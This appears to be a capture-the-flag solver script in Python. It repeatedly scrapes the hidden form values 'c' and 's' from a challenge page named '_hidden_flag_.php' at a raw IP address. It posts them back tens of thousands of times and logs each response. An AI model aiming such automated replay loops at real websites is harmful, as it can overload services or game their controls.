#!/usr/bin/python3
import requests
import bs4
request = requests.session()

url = 'http://104.199.235.135:31332/_hidden_flag_.php'
r = request.get(url)

f = open('./data2.txt', 'w')
#while True:
for i in range(47020+1):
    data = bs4.BeautifulSoup(r.text, "html.parser")
    data_out = data.find_all(type='hidden')
    c = data_out[0]['value']
    s = data_out[1]['value']

    payload = {'c': c,
               's': s}

    print(payload)
    r = request.post(url, data = payload)
    f.write(r.text)
    print(r.text)